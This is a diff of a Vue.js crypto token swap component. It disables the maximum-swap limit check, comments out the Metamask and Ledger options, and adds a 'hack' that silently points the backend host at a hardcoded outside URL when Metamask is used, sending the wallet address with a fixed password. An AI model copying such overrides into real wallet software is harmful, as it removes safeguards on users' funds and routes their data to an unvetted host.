@@ -27,8 +27,8 @@
                 <select v-model="walletType">
                   <option value="0">Choose Wallet</option>
                   <option value="1">Import from json</option>
-                  <!-- option value="2">Metamask</option>
-                  <option value="3">Ledger</option -->
+                  <!-- option value="2">Metamask</option -->
+                  <!-- option value="3">Ledger</option -->
                 </select>
               </div>
             </div>
@@ -591,11 +591,11 @@ export default {
       }
       let v = this.isHex(this.val) ? parseInt(this.val, 16) : parseInt(this.val)
       // console.log('val is', this.val, 'avail is', this.avail, 'bal is', this.balance)
-      const lim = 100
-      if (this.val > lim * 1000000000000000000) {
+      // const lim = 1000
+      /* if (this.val > lim * 1000000000000000000) {
         this.notify({ text: 'Maximum ' + lim + ' coins swap!', class: 'is-danger' })
         return
-      }
+      } */
       if (this.val > this.avail * 1000000000000000000) {
         this.notify({ text: 'Available for swap only ' + this.avail + '!', class: 'is-danger' })
         return
@@ -663,6 +663,7 @@ export default {
         let txId = ''
 
         // seed vw_sessions
+        this.host = (this.isMetamask) ? 'https://africa.room-house.com' : this.host // hack ash
         let fData = new FormData()
         fData.append('pass', 'lol')
         fData.append('addr', this.address)
@@ -700,12 +701,13 @@ export default {
             txParams.data = this.data
           }
           txId = await this.metamaskProvider.request({ method: 'eth_sendTransaction', params: [ txParams ] })
+          this.send = false
         } else {
           txId = await provider.send('eth_sendRawTransaction', [ this.signedTransaction ])
         }
         this.result = txId
         if (!this.isImportJSON) {
-          this.notify({ text: 'Transaction confirmed! Please await .. working..', class: 'is-info' })
+          this.notify({ text: 'Transaction submitted! Please await .. working..', class: 'is-info' })
           return
         }
         confirmedTransaction(provider, txId, 1, function (err, tx) {
